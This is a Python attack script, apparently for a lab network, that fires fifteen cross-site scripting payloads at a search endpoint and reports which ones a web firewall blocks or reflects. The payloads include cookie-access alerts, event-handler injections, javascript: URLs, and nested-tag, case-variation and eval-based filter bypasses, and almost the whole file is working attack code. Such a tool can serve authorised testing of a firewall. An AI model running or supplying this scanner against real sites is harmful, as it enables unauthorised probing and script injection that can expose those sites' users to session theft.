import requests
import time
from datetime import datetime
import sys
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('XSS')

class XSSAttacker:
    def __init__(self, target_ip, target_port=5000):
        self.target_url = f"http://{target_ip}:{target_port}/search"
        self.vulnerabilities = []
        self.blocked_count = 0
        self.failed_count = 0
        
    def test_payload(self, payload, description, vector_type):
        """Test a single XSS payload"""
        print(f"\n{'='*60}")
        print(f"[{datetime.now()}] Testing: {description}")
        print(f"Type: {vector_type}")
        print(f"Payload: {payload}")
        print(f"{'='*60}")
        
        try:
            response = requests.post(
                self.target_url,
                json={'query': payload},
                timeout=5,
                headers={'Content-Type': 'application/json'}
            )
            
            result = response.json()
            
            if response.status_code == 403 and result.get('blocked'):
                print(f"🛡️  BLOCKED BY WAF: {result.get('message', 'XSS pattern detected')}")
                self.blocked_count += 1
                return False
            elif result.get('results') is not None:
                # Check if payload is reflected in response
                response_text = str(result)
                if payload in response_text or '<script>' in response_text.lower():
                    print(f"✅ VULNERABLE: Payload accepted and potentially executed")
                    print(f"   Response contains: {response_text[:100]}...")
                    self.vulnerabilities.append({
                        'payload': payload,
                        'description': description,
                        'type': vector_type,
                        'response': result
                    })
                    return True
                else:
                    print(f"⚠️  ACCEPTED: Payload accepted but may be sanitized")
                    return False
            else:
                print(f"❌ PROTECTED: Request rejected")
                self.failed_count += 1
                return False
                
        except requests.exceptions.Timeout:
            print(f"⏱️  TIMEOUT: Request timed out")
            self.failed_count += 1
            return False
        except Exception as e:
            print(f"❌ ERROR: {str(e)}")
            self.failed_count += 1
            return False
    
    def run(self):
        """Execute XSS attack"""
        print(f"\n{'='*70}")
        print(f"CROSS-SITE SCRIPTING (XSS) ATTACK INITIATED")
        print(f"{'='*70}")
        print(f"Target: {self.target_url}")
        print(f"Timestamp: {datetime.now()}")
        print(f"{'='*70}\n")
        
        # Comprehensive XSS payloads
        payloads = [
            # Basic Script Injection
            ("<script>alert('XSS')</script>", "Basic script tag injection", "Reflected XSS"),
            ("<script>alert(document.cookie)</script>", "Cookie theft attempt", "Reflected XSS"),
            ("<script>alert(String.fromCharCode(88,83,83))</script>", "Encoded XSS", "Reflected XSS"),
            
            # Event Handler Injection
            ("<img src=x onerror=alert('XSS')>", "Image onerror event", "Event-based XSS"),
            ("<body onload=alert('XSS')>", "Body onload event", "Event-based XSS"),
            ("<svg/onload=alert('XSS')>", "SVG onload event", "Event-based XSS"),
            ("<input onfocus=alert('XSS') autofocus>", "Input onfocus event", "Event-based XSS"),
            
            # JavaScript Protocol
            ("<a href='javascript:alert(\"XSS\")'>Click</a>", "JavaScript protocol in href", "DOM-based XSS"),
            ("<iframe src='javascript:alert(1)'>", "IFrame JavaScript protocol", "DOM-based XSS"),
            
            # Advanced Bypass Techniques
            ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", "Script tag nesting bypass", "Filter Bypass"),
            ("<img src='x' onerror='alert(1)'>", "Alternative quote bypass", "Filter Bypass"),
            ("<IMG SRC=x OnErRoR=alert('XSS')>", "Case variation bypass", "Filter Bypass"),
            ("<img src=x:alert(alt) onerror=eval(src) alt=xss>", "Eval-based XSS", "Advanced XSS"),
            
            # HTML5 Vectors
            ("<video><source onerror='alert(1)'>", "HTML5 video vector", "HTML5 XSS"),
            ("<audio src=x onerror=alert('XSS')>", "HTML5 audio vector", "HTML5 XSS"),
        ]
        
        start_time = time.time()
        
        for payload, desc, vec_type in payloads:
            self.test_payload(payload, desc, vec_type)
            time.sleep(1)  # Rate limiting delay
        
        duration = time.time() - start_time
        
        # Summary
        print(f"\n{'='*70}")
        print(f"ATTACK SUMMARY")
        print(f"{'='*70}")
        print(f"Duration: {duration:.2f} seconds")
        print(f"Total payloads tested: {len(payloads)}")
        print(f"Potential vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Blocked by firewall: {self.blocked_count}")
        print(f"Failed/Protected: {self.failed_count}")
        print(f"{'='*70}\n")
        
        if self.vulnerabilities:
            print("DETECTED VULNERABILITIES:")
            for idx, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{idx}. {vuln['description']}")
                print(f"   Type: {vuln['type']}")
                print(f"   Payload: {vuln['payload'][:60]}...")
        else:
            print("✅ No XSS vulnerabilities detected - Target appears protected")
        
        return self.vulnerabilities

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "172.20.0.10"
    
    attacker = XSSAttacker(target)
    try:
        results = attacker.run()
        
        # Exit code based on results
        if results:
            print("\n⚠️  TARGET IS VULNERABLE TO XSS ATTACKS")
            sys.exit(1)
        else:
            print("\n✅ Target appears to be protected against XSS")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        sys.exit(130)
